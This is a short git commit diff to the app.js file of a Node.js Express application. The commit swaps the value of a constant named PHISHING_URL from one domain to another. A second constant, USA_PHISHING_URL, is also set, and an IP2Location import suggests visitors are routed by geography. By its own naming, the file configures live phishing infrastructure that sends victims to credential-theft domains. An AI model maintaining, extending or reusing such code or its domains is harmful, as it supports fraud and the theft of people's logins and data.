3bf2b69cc2f8ecdbda3782fa83f2d9ab98005197
hisenberg <me@someine.com>
2025-05-29 16:25:40 -0700

    new

--- app.js
+++ app.js
@@ -8,7 +8,7 @@ const expressLayout = require("express-ejs-layouts");
 const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
-const PHISHING_URL = "infineze.cc";
+const PHISHING_URL = "nexfitpol.site";
 const USA_PHISHING_URL = "vetifyhub.cc";
 
 
